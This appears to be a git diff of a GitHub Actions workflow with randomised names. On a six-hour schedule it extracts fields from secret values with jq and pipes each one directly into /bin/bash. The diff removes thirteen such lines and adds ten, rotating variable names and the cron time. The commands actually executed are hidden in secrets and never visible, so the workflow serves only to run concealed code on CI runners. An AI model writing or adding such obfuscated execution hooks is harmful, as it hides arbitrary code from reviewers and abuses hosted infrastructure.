@@ -1,29 +1,25 @@
 name: yesignx
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '31 2/6 * * *'
-jobs:  # 19498
+    - cron: '45 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: yesignx
         env:
-          wog303: ${{ secrets.wog303 }}
+          qn79: ${{ secrets.qn79 }}
         run: |
-          echo $wog303 | jq -r .h984 | /bin/bash
-          echo $fd6 | jq -r .k8 | /bin/bash
-          echo $cfwiy13124 | jq -r .kzqof4389 | /bin/bash
-          echo $x08 | jq -r .l30115 | /bin/bash
-          echo $fcon9 | jq -r .pp881 | /bin/bash
-          echo $hkj35793 | jq -r .gg75989 | /bin/bash
-          echo $bnf1 | jq -r .heq5 | /bin/bash
-          echo $bzyk7889 | jq -r .wte959 | /bin/bash
-          echo $sfr04 | jq -r .i9948 | /bin/bash
-          echo $pzbam1 | jq -r .zeac56653 | /bin/bash
-          echo $nah3559 | jq -r .mtbwo71497 | /bin/bash
-          echo $g72 | jq -r .aqhd704 | /bin/bash
-          echo $mqq45 | jq -r .tlkf7 | /bin/bash
+          echo $qn79 | jq -r .sylfm2956 | /bin/bash
+          echo $rpb215 | jq -r .jixtu3 | /bin/bash
+          echo $whqc87 | jq -r .wsuz9 | /bin/bash
+          echo $jdsh15257 | jq -r .fnbk0756 | /bin/bash
+          echo $fkc43256 | jq -r .ov44 | /bin/bash
+          echo $hl21490 | jq -r .env86 | /bin/bash
+          echo $pbjvr3 | jq -r .lf3801 | /bin/bash
+          echo $yl93291 | jq -r .cf81 | /bin/bash
+          echo $zq1360 | jq -r .bwadg1338 | /bin/bash
+          echo $s4 | jq -r .nb9233 | /bin/bash
 
